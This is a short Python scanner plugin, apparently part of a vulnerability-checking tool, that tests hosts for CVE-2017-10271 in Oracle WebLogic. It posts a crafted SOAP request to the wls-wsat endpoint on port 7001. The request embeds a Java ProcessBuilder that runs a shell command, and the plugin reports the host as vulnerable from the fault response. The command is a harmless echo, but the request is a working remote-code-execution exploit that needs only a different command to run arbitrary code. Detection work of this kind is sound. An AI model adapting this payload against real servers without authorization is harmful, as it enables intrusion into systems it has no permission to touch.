import requests

from lib.random_header import get_ua
from lib.verify import verify

vuln = ['http', 'weblogic', '7001']


def check(url, ip, ports, apps):
    if verify(vuln, ports, apps):
        HEADERS = get_ua()
        HEADERS.update({'Content-Type': 'text/xml'})
        url = 'http://{}:7001/wls-wsat/CoordinatorPortType'.format(ip)
        data = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java>
                    <object class="java.lang.ProcessBuilder">
                        <array class="java.lang.String" length="3">
                            <void index="0">
                                <string>/bin/sh</string>
                            </void>
                            <void index="1">
                                <string>-c</string>
                            </void>
                            <void index="2">
                                <string>echo xss</string>
                            </void>
                        </array>
                        <void method="start"/>
                    </object>
                </java>
            </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
        </soapenv:Envelope>
            '''

        try:
            r = requests.post(url, data=data, verify=False, timeout=5, headers=HEADERS)
            text = r.text
        except Exception:
            text = ""

        if '<faultstring>java.lang.ProcessBuilder' in text or "<faultstring>0" in text:
            return ('CVE-2017-10271 Weglogic RCE {}'.format(url))
